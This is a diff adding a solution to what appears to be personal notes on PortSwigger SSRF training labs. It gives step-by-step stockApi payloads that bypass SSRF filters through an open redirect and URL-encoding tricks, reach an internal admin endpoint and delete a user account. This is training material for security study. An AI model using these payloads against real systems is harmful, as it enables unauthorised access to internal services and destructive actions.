@@ -27,3 +27,10 @@ solution: (note: I had to look at 3 of the hints to solve this lab. I was able t
     step-1: stockApi=http://127.0.0.1%2523@stock.weliketoshop.net%3A8080
     step-2: stockApi=http://127.0.0.1%2523@stock.weliketoshop.net%3A8080/admin/delete?username=carlos
 
+[lab: SSRF with filter bypass via open redirection vulnerability]
+url: https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
+solution: 
+    step-1: view source of webpage, and extract open redirect '/product/nextProduct' with parameter 'path'
+    step-2: paste open redirect into stockApi parameter, 'stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/'
+    step-3: append portion response containing href to delete carlos onto string from step-2 ('stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos&')
+
